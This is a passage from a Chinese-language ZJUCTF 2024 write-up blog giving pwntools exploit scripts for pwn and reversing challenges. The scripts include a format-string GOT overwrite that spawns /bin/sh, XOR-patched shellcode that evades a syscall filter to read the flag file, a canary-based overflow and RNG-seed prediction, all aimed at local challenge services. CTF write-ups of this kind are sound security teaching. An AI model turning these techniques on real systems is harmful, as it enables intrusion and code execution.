class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x2150</span></span><br><span class="line">info(<span class="string">f&quot;base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(base_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 5: overflow to jump to $rebase(0x0000000000001F9F)</span></span><br><span class="line">puts_addr = <span class="number">0x1F9F</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">285</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">285</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">puts_addr = base_addr + puts_addr</span><br><span class="line">payload = flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line">payload = flat(<span class="string">&#x27;submit&#x27;</span>, <span class="string">b&#x27;=&#x27;</span>*(<span class="number">264</span>-<span class="built_in">len</span>(<span class="string">&#x27;submit&#x27;</span>)), canary, <span class="number">0</span>, puts_addr)</span><br><span class="line">p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, payload)</span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;submit your score&#x27;, &quot;submit&quot;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>得到flag: <code>ZJUCTF&#123;3veRY_7h1n9_1s_UNdEr_Y0uR_c0n7r0l!!&#125;</code></p>
<h4 id="simple-echo"><a href="#simple-echo" class="headerlink" title="simple echo"></a>simple echo</h4><p>checksec查看保护机制：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/brownie/ctf/matches/2024 ZJUCTF/pwn/simple-echo-attachment/app&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<p>ida查看，发现存在格式化字符串漏洞和栈溢出漏洞</p>
<ul>
<li>首先可以通过格式化字符串漏洞获取libc基址</li>
<li>然后通过格式化字符串漏洞将rop链写入返回地址</li>
</ul>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./app&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *0x0000000000401351&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">39667</span>)</span><br><span class="line"><span class="comment"># 泄漏libc地址</span></span><br><span class="line">payload = flat(<span class="string">b&#x27;%27$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Dididi, I am a simple echo server!&#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Blala:0x&quot;</span>)</span><br><span class="line">libc_addr = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">info(<span class="string">f&quot;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改printf got地址</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./app&#x27;</span>)</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x00000000001d8698</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x000000000002a3e5</span>+libc_addr</span><br><span class="line">low = system_addr &amp; <span class="number">0xffff</span></span><br><span class="line">high = (system_addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffff</span></span><br><span class="line">info(<span class="string">f&#x27;system_addr: <span class="subst">&#123;<span class="built_in">hex</span>(system_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> low &lt; high:</span><br><span class="line">    payload = flat(<span class="string">f&#x27;%<span class="subst">&#123;low-<span class="number">6</span>&#125;</span>c%12$hn%<span class="subst">&#123;high-low&#125;</span>c%13$hn&#x27;</span>.ljust(<span class="number">0x20</span>-<span class="number">6</span>), printf_got, printf_got+<span class="number">2</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    payload = flat(<span class="string">f&#x27;%<span class="subst">&#123;high-<span class="number">6</span>&#125;</span>c%12$hn%<span class="subst">&#123;low-high&#125;</span>c%13$hn&#x27;</span>.ljust(<span class="number">0x20</span>-<span class="number">6</span>), printf_got+<span class="number">2</span>, printf_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;; /bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag: <code>ZJUCTF&#123;f0rMAt_5TR1Ng_bU9_iS_O1D_8uT_c001|0335&#125;</code></p>
<h3 id="sandbox"><a href="#sandbox" class="headerlink" title="sandbox"></a>sandbox</h3><p>禁用了execve系统调用，并且不允许syscall（<code>\x0f\x05</code>）字节出现，同时还没有给出flag的文件名。</p>
<ol>
<li>通过先传入<code>\x0f\x03</code>，然后将其与<code>\x06</code>异或即可得到syscall。</li>
<li>通过<code>getdents64</code>系统调用获取到目标flag文件名</li>
<li>通过<code>orw</code>获取flag内容</li>
</ol>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x00000000000014BF)&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">36007</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># shellcode = asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#     .section .shellcode,&quot;awx&quot;</span></span><br><span class="line"><span class="comment">#     .global _start</span></span><br><span class="line"><span class="comment">#     .global __start</span></span><br><span class="line"><span class="comment">#     _start:</span></span><br><span class="line"><span class="comment">#     __start:</span></span><br><span class="line"><span class="comment">#     .intel_syntax noprefix</span></span><br><span class="line"><span class="comment">#     .p2align 0</span></span><br><span class="line"><span class="comment">#         /* open(file=&#x27;/&#x27;, oflag=0, mode=0) */</span></span><br><span class="line"><span class="comment">#         /* push b&#x27;/\x00&#x27; */</span></span><br><span class="line"><span class="comment">#         push rdx</span></span><br><span class="line"><span class="comment">#         push 0x2f</span></span><br><span class="line"><span class="comment">#         mov rdi, rsp</span></span><br><span class="line"><span class="comment">#         xor edx, edx /* 0 */</span></span><br><span class="line"><span class="comment">#         xor esi, esi /* 0 */</span></span><br><span class="line"><span class="comment">#         /* call open() */</span></span><br><span class="line"><span class="comment">#         push 2 /* 2 */</span></span><br><span class="line"><span class="comment">#         pop rax</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rdx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rdx+0x1e], 0x6</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;) + b&quot;\x0f\x03&quot; + asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#         /* getdents64(fd=&#x27;rax&#x27;, dirp=&#x27;rsp&#x27;, count=0x1000) */</span></span><br><span class="line"><span class="comment">#         mov rdi, rax</span></span><br><span class="line"><span class="comment">#         xor edx, edx</span></span><br><span class="line"><span class="comment">#         mov dh, 0x1000 &gt;&gt; 8</span></span><br><span class="line"><span class="comment">#         mov rsi, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         add rsi, 0x100</span></span><br><span class="line"><span class="comment">#         /* call getdents64() */</span></span><br><span class="line"><span class="comment">#         xor eax, eax</span></span><br><span class="line"><span class="comment">#         mov al, 217 /* 0xd9 */</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rcx+0x46], 0x6</span></span><br><span class="line"><span class="comment">#     &quot;&quot;&quot;) + b&quot;\x0f\x03&quot; + asm(&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#         /* write(fd=1, buf=&#x27;rsp&#x27;, n=0x1000) */</span></span><br><span class="line"><span class="comment">#         push 1</span></span><br><span class="line"><span class="comment">#         pop rdi</span></span><br><span class="line"><span class="comment">#         xor edx, edx</span></span><br><span class="line"><span class="comment">#         mov dh, 0x1000 &gt;&gt; 8</span></span><br><span class="line"><span class="comment">#         mov rsi, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         add rsi, 0x100</span></span><br><span class="line"><span class="comment">#         /* call write() */</span></span><br><span class="line"><span class="comment">#         push 1 /* 1 */</span></span><br><span class="line"><span class="comment">#         pop rax</span></span><br><span class="line"><span class="comment">#         /* syscall */</span></span><br><span class="line"><span class="comment">#         mov r8, 0x6</span></span><br><span class="line"><span class="comment">#         mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="comment">#         xor word ptr [rcx+0x6d], 0x6</span></span><br><span class="line"><span class="comment"># &quot;&quot;&quot;) + b&quot;\x0f\x03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># de27cb9335d01bb7576f00a72c13239d</span></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    .section .shellcode,&quot;awx&quot;</span></span><br><span class="line"><span class="string">    .global _start</span></span><br><span class="line"><span class="string">    .global __start</span></span><br><span class="line"><span class="string">    _start:</span></span><br><span class="line"><span class="string">    __start:</span></span><br><span class="line"><span class="string">    .intel_syntax noprefix</span></span><br><span class="line"><span class="string">    .p2align 0</span></span><br><span class="line"><span class="string">        /* open(file=&#x27;/de27cb9335d01bb7576f00a72c13239d&#x27;, oflag=0, mode=0) */</span></span><br><span class="line"><span class="string">        /* push b&#x27;/de27cb9335d01bb7576f00a72c13239d\x00&#x27; */</span></span><br><span class="line"><span class="string">        push rdx</span></span><br><span class="line"><span class="string">        push 0x64</span></span><br><span class="line"><span class="string">        mov rax, 0x3933323331633237</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x6130306636373537</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x6262313064353333</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rax, 0x396263373265642f</span></span><br><span class="line"><span class="string">        push rax</span></span><br><span class="line"><span class="string">        mov rdi, rsp</span></span><br><span class="line"><span class="string">        xor edx, edx /* 0 */</span></span><br><span class="line"><span class="string">        xor esi, esi /* 0 */</span></span><br><span class="line"><span class="string">        /* call open() */</span></span><br><span class="line"><span class="string">        push 2 /* 2 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x4a], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span> + asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* call read(&#x27;rax&#x27;, &#x27;rsp&#x27;, 0x100) */</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        xor eax, eax /* SYS_read */</span></span><br><span class="line"><span class="string">        xor edx, edx</span></span><br><span class="line"><span class="string">        mov dh, 0x100 &gt;&gt; 8</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x68], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span> + asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        /* write(fd=0, buf=&#x27;rsp&#x27;, n=&#x27;rax&#x27;) */</span></span><br><span class="line"><span class="string">        mov rdi, 1 /* 0 */</span></span><br><span class="line"><span class="string">        mov rdx, rax</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        /* call write() */</span></span><br><span class="line"><span class="string">        push 1 /* 1 */</span></span><br><span class="line"><span class="string">        pop rax</span></span><br><span class="line"><span class="string">        /* syscall */</span></span><br><span class="line"><span class="string">        mov r8, 0x6</span></span><br><span class="line"><span class="string">        mov rcx, [rbp-0x20]</span></span><br><span class="line"><span class="string">        xor word ptr [rcx+0x8d], 0x6</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>) + <span class="string">b&quot;\x0f\x03&quot;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your shellcode:&#x27;</span>, shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag内容：<code>ZJUCTF&#123;M45ter_of_O_R_W&#125;</code></p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="rev-beginner-1"><a href="#rev-beginner-1" class="headerlink" title="rev beginner 1"></a>rev beginner 1</h3><p>基础逆向题：</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rev1&#x27;</span>)</span><br><span class="line">temp = <span class="string">b&#x27;\x5a\x4b\x57\x46&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x58\x4b\x81\x79&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x6d\x7f\x69\x74&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7f\x6c\x74\x84&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7e\x70\x84\x7c&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x7b\x7d\x8a\x56\x95&#x27;</span></span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> temp:</span><br><span class="line">    result += p8(t - i)</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">info(<span class="string">f&quot;result: <span class="subst">&#123;result.<span class="built_in">hex</span>()&#125;</span>&quot;</span>)</span><br><span class="line">p.sendline(result)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag: <code>ZJUCTF&#123;rev_is_fun_right?&#125;</code></p>
<h4 id="rev-beginner-2"><a href="#rev-beginner-2" class="headerlink" title="rev beginner 2"></a>rev beginner 2</h4><p>基础逆向题，通过模拟das指令进行逐字符爆破，得到flag</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./rev2&#x27;</span>)</span><br><span class="line">gdb.attach(p, <span class="string">&#x27;b *$rebase(0x00001336)&#x27;</span>)</span><br><span class="line">v12 = <span class="string">b&#x27;\x3c\x1e\x23\x30&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x52\x0d\x4d\x79&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x42\x3d\x4f\xdb&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\xff\xb3\x2f\x00&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x1f\x3e\x32\x4f&#x27;</span></span><br><span class="line">v12 += <span class="string">b&#x27;\x52\x3e\xa3\xa4\x21\x8f&#x27;</span></span><br><span class="line"></span><br><span class="line">v14 = <span class="string">b&#x27;\x75\x82\x9b\xd1&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xf6\xbb\xa6\x36&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xac\xe8\xb1\x7f&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xb0\x67\xb8\x19&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\xb6\x3f\x38\x07&#x27;</span></span><br><span class="line">v14 += <span class="string">b&#x27;\x2e\xbd\x83\x52\xf5\xff&#x27;</span></span><br><span class="line"></span><br><span class="line">temp = <span class="string">b&#x27;\x8d\xa8\xcd\xe4&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xf8\xee\xce\xce&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xcf\x11\xbf\x6e&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xb8\xb9\x50\x4b&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\xbe\x6d\x6b\x28&#x27;</span></span><br><span class="line">temp += <span class="string">b&#x27;\x41\xeb\xf3\xb3\xf5\x87&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">das_simulation</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="comment"># 假设 a 和 b 都是16位的BCD值（输入为整数）</span></span><br><span class="line">    <span class="comment"># 只考虑AL寄存器，即最低8位的操作</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 将两个数减法</span></span><br><span class="line">    result = a - b</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 取出低8位，模拟 AL 寄存器的效果</span></span><br><span class="line">    al = result &amp; <span class="number">0xFF</span></span><br><span class="line">    <span class="comment"># info(al)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 初始化 CF 和 AF 标志</span></span><br><span class="line">    cf = <span class="number">0</span></span><br><span class="line">    af = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 AF（低4位超过9或者有借位时需要调整）</span></span><br><span class="line">    <span class="keyword">if</span> (al &amp; <span class="number">0x0F</span>) &gt; <span class="number">9</span> <span class="keyword">or</span> ((a &amp; <span class="number">0x0F</span>) &lt; (b &amp; <span class="number">0x0F</span>)):</span><br><span class="line">        al = (al - <span class="number">6</span>) &amp; <span class="number">0xFF</span>  <span class="comment"># 修正低四位</span></span><br><span class="line">        af = <span class="number">1</span>  <span class="comment"># 设置 AF 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 检查 CF（高4位超过9或者有借位时需要调整）</span></span><br><span class="line">    <span class="keyword">if</span> (al &amp; <span class="number">0xF0</span>) &gt; <span class="number">0x90</span> <span class="keyword">or</span> result &lt; <span class="number">0</span>:</span><br><span class="line">        al = (al - <span class="number">0x60</span>) &amp; <span class="number">0xFF</span>  <span class="comment"># 修正高四位</span></span><br><span class="line">        cf = <span class="number">1</span>  <span class="comment"># 设置 CF 标志</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> al, cf, af</span><br><span class="line"></span><br><span class="line">result = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    info(<span class="string">f&#x27;i : <span class="subst">&#123;i&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> guess <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        al, cf, af = das_simulation(guess, v12[i])</span><br><span class="line">        <span class="comment"># info(f&#x27;al: &#123;hex(al)&#125;, cf: &#123;cf&#125;, af: &#123;af&#125;&#x27;)</span></span><br><span class="line">        <span class="keyword">if</span> (al + v14[i])&amp;<span class="number">0xff</span> == temp[i]:</span><br><span class="line">            info(<span class="string">f&quot;guess: <span class="subst">&#123;<span class="built_in">hex</span>(guess)&#125;</span> is correct&quot;</span>)</span><br><span class="line">            result += p8(guess)</span><br><span class="line">            info(<span class="string">f&quot;result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> guess == <span class="number">255</span>:</span><br><span class="line">        result += <span class="string">b&#x27;*&#x27;</span></span><br><span class="line">p.sendline(result)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag：<code>ZJUCTF&#123;welc0me-2-reverse!&#125;</code></p>
<h4 id="中-A-口算"><a href="#中-A-口算" class="headerlink" title="中 A 口算"></a>中 A 口算</h4><p>其种子为2010年同一时间，因此可以预测所有的题目。</p>
<img src="/posts/dc126860/image-20241022212702474.png" class="" title="image-20241022212702474">

<p>如图，只要存在answer，就会一直生成题目，因此可以一次输入足够长（0x1000长度）的答案，可以快速得分</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"><span class="comment"># 601681286521741824 ? 2198172281756103560</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定日期（年-月-日 时:分:秒）</span></span><br><span class="line">year = <span class="number">2010</span></span><br><span class="line">month = <span class="number">10</span></span><br><span class="line">day = <span class="number">22</span></span><br><span class="line">hour = <span class="number">21</span></span><br><span class="line">minute = <span class="number">26</span></span><br><span class="line">second = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建 datetime 对象</span></span><br><span class="line">dt = datetime(year, month, day, hour, minute, second)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取时间戳</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.mktime(dt.timetuple()))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">37093</span>)</span><br><span class="line">seed = timestamp</span><br><span class="line"><span class="comment"># seed = 0</span></span><br><span class="line">guess = -<span class="number">0x1</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Question Set:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># get first challenge</span></span><br><span class="line">challenge = (p.recvline()).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">v2 = challenge.split(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">v2[<span class="number">0</span>] = <span class="built_in">int</span>(v2[<span class="number">0</span>])</span><br><span class="line">v2[<span class="number">1</span>] = <span class="built_in">int</span>(v2[<span class="number">1</span>])</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3600</span>):</span><br><span class="line">    <span class="comment"># 获取当前时间（秒级别）</span></span><br><span class="line">    guess += <span class="number">1</span></span><br><span class="line">    info(<span class="string">f&quot;guess: <span class="subst">&#123;guess&#125;</span>&quot;</span>)</span><br><span class="line">    info(<span class="string">f&quot;seed+guess: <span class="subst">&#123;seed+guess&#125;</span>&quot;</span>)</span><br><span class="line">    seed_correct = <span class="literal">False</span></span><br><span class="line">    <span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line">    <span class="comment"># gdb.attach(p, &quot;&quot;&quot;</span></span><br><span class="line">    <span class="comment">#            b *$rebase(0x0000000000001858)</span></span><br><span class="line">    <span class="comment">#            b *$rebase(0x0000000000001994)&quot;&quot;&quot;)</span></span><br><span class="line">    libc.srand(seed+guess)</span><br><span class="line">    <span class="comment"># 生成一个随机数（类似rand()）</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate_challenge</span>():</span><br><span class="line">        v1 = libc.rand()  <span class="comment"># C的rand()通常生成0到RAND_MAX之间的值，RAND_MAX = 2^31-1</span></span><br><span class="line">        v2 = libc.rand()</span><br><span class="line">        v3 = (v1 &lt;&lt; <span class="number">31</span>) | v2 ^ libc.rand()</span><br><span class="line">        v4 = v2 | ((v1 ^ libc.rand()) &lt;&lt; <span class="number">31</span>)</span><br><span class="line">        info(<span class="string">f&quot;question:\t <span class="subst">&#123;v3&#125;</span> ? <span class="subst">&#123;v4&#125;</span> &quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> v3, v4</span><br><span class="line"></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10089</span>):</span><br><span class="line">        v1 = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">        info(<span class="string">f&quot;challenge:\t<span class="subst">&#123;v2[<span class="number">0</span>]&#125;</span> ? <span 